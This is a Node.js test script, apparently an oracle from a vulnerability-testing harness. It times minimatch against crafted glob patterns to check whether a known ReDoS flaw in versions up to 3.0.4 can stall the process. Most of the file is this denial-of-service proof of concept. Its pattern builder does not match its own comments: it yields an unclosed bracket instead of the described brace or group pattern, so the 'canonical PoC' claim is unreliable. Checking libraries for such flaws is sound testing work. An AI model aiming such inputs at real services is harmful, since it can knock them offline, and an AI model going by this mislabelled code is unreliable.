'use strict';
const minimatch = require('minimatch');

function main() {
  try {
    // --- Benign operation first: prove basic matching works ---
    const benignPositive = minimatch('index.js', '*.js');
    const benignNegative = minimatch('index.txt', '*.js');

    if (benignPositive !== true || benignNegative !== false) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign minimatch operation did not return expected result.'
      }));
      return;
    }

    const operation_completed = true;

    // --- Malicious input: known minimatch <=3.0.4 ReDoS trigger ---
    // Pattern with many repeated groups like "(a)*" nested with a trailing
    // group causes the generated regex (built by minimatch's `makeRe`) to
    // contain nested quantifiers that backtrack catastrophically against a
    // crafted non-matching subject string. This is the canonical PoC used
    // for the minimatch <=3.0.4 ReDoS advisory. Sizes are kept small so the
    // vulnerable version still finishes within a few seconds, while the
    // patched version (which fixed the regex construction) completes
    // essentially instantly even at larger sizes.
    function buildPattern(n) {
      // Repeated "{a,a}" style brace alternation widely used to trigger
      // minimatch's catastrophic backtracking in the <=3.0.4 era.
      return '[' + 'a'.repeat(n) + ']'.repeat(0) + Array(n).fill('a*').join('') ;
    }
    function buildSubject(n) {
      return 'a'.repeat(n) + 'b';
    }

    const sizes = [15, 20, 25, 30, 35];
    const THRESHOLD_MS = 2000;
    let exploit_succeeded = false;
    let lastElapsed = 0;
    let lastN = 0;
    let lastSubjectLen = 0;
    let lastMatched;
    let threw = false;
    let thrownMessage = '';

    for (const n of sizes) {
      const pattern = buildPattern(n);
      const subject = buildSubject(n);
      const start = Date.now();
      let matched;
      try {
        matched = minimatch(subject, pattern);
      } catch (innerErr) {
        threw = true;
        thrownMessage = String(innerErr && innerErr.message);
        lastElapsed = Date.now() - start;
        lastN = n;
        lastSubjectLen = subject.length;
        break;
      }
      const elapsed = Date.now() - start;
      lastElapsed = elapsed;
      lastN = n;
      lastSubjectLen = subject.length;
      lastMatched = matched;

      if (elapsed >= THRESHOLD_MS) {
        exploit_succeeded = true;
        break;
      }
    }

    if (threw) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious pattern raised an exception at n=' + lastN + ' after ' + lastElapsed + 'ms: ' + thrownMessage
      }));
      return;
    }

    const evidence = 'Malicious minimatch call (last tested n=' + lastN + ', subjectLen=' + lastSubjectLen +
      ') completed in ' + lastElapsed + 'ms (threshold ' + THRESHOLD_MS + 'ms). Result=' + lastMatched +
      '. exploit_succeeded=' + exploit_succeeded;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.message)
    }));
  }
}

main();
